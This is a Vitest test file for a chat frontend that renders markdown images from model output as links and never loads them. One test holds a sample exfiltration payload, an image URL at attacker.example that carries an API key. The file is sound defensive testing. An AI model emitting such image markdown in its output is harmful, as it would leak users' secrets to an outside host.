import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";

import { MARKDOWN_IMAGE_COMPONENT } from "../../frontend/src/markdownImage.jsx";

//the terms tell people RouterChat only ever talks to openrouter, so nothing a model sends back is
//allowed to make the browser fetch a third party host on its own

const EXTERNAL_SRC = /<img[^>]+src=/i;

function render(markdown) {
  return renderToStaticMarkup(
    <ReactMarkdown components={MARKDOWN_IMAGE_COMPONENT}>{markdown}</ReactMarkdown>,
  );
}

describe("markdown images", () => {
  it("renders a remote image as a link instead of loading it", () => {
    const html = render("Here is a picture ![tracker](https://tracker.example.net/pixel.png)");

    expect(html).not.toMatch(EXTERNAL_SRC);
    expect(html).toContain('href="https://tracker.example.net/pixel.png"');
    expect(html).toContain("tracker");
  });

  it("does not load an exfiltration pixel hidden in model output", () => {
    const html = render("![](https://attacker.example/collect?data=my-api-key)");

    expect(html).not.toMatch(EXTERNAL_SRC);
  });

  it("falls back to the url when the image has no alt text", () => {
    const html = render("![](https://cdn.example.org/diagram.png)");

    expect(html).toContain("https://cdn.example.org/diagram.png");
  });

  it("leaves ordinary markdown alone", () => {
    const html = render("A [real link](https://example.com) and `code`.");

    expect(html).toContain('href="https://example.com"');
    expect(html).toContain("<code>code</code>");
  });
});
